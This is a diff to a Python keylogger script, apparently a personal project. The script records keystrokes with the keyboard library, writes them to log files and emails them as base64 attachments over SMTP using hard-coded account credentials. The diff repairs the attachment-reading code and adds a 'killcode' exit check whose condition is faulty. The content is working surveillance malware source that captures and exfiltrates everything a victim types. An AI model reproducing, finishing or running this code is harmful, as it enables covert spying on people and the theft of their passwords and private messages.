@@ -1,4 +1,5 @@
 import os
+import time
 import keyboard # for keylogs
 import smtplib # for sending email using SMTP protocol (gmail)
 # Timer is to make a method runs after an `interval` amount of time
@@ -15,6 +16,7 @@ EMAIL_ADDRESS = "keylog404@outlook.com"
 EMAIL_PASSWORD = "password404604"
 
 class Keylogger:
+    filerr = ""
     def __init__(self, interval, report_method="email"):
         # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
@@ -63,6 +65,7 @@ class Keylogger:
         with open(f"{self.filename}.txt", "w") as f:
             # write the keylogs to the file
             print(self.log, file=f)
+            f.close
         print(f"[+] Saved {self.filename}.txt")
     
     def prepare_mail(self, message):
@@ -82,14 +85,20 @@ class Keylogger:
         # attach log fileo
         part = MIMEBase('application', "octet-stream")
         script_dir = os.path.dirname(__file__) #<-- absolute dir the script is in
-        rel_path = self.filename
+        rel_path = self.filename+".txt"
+        # print(self.filename)
+        # print("keylog-2023-04-25-215744_2023-04-25-215845.txt")
+        # rel_path = "keylog-2023-04-25-215744_2023-04-25-215845.txt"
         abs_file_path = os.path.join(script_dir, rel_path)
         
         # filePath = os.getcwd() + self.filename
         # filePath.replace("\\\\",'\\')
-        with open("C:\\Users\\tyfer\\OneDrive\\Documents\\GitHub\\keylogger\\keylog-2023-04-08-150456_2023-04-08-150656.txt", 'rb') as file:
-            part.set_payload(file.read)
-       # encoders.encode_base64(part)
+        x = os.path.abspath(self.filename)
+        part.set_payload(open(abs_file_path, 'rb').read())
+        # part.set_payload(open("C:\\Users\\tyfer\\OneDrive\\Documents\\GitHub\\keylogger\\keylog-2023-04-25-215744_2023-04-25-215845.txt", 'rb').read())
+        # with open("C:\\Users\\tyfer\\OneDrive\\Documents\\GitHub\\keylogger\\keylog-2023-04-08-150456_2023-04-08-150656.txt", 'rb') as file:
+        #     part.set_payload(file.read)
+        encoders.encode_base64(part)
         part.add_header('Content-Disposition',
                         'attachment; filename={}'.format(Path(self.filename).name))
         msg.attach(part)
@@ -110,6 +119,18 @@ class Keylogger:
         server.quit()
         if verbose:
             print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")
+    def killcode(self):
+        with open(self.filename+".txt", 'r') as fp:
+        # read all lines using readline()
+            lines = fp.readlines()
+            for row in lines:
+                # check if string present on a current line
+                #print(row.find(word))
+                # find() method returns -1 if the value is not found,
+                # if found it returns index of the first occurrence of the substring
+                if row.find("q[CTRL]") != -1 or row.find("q[RIGHT_CTRL]"):
+                    print("Kill me!")
+                    quit()
     def report(self):
         """
         This function gets called every `self.interval`
@@ -122,6 +143,7 @@ class Keylogger:
             self.update_filename()
             self.report_to_file()
             self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+            self.killcode()
             # if you don't want to print in the console, comment below line
             print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
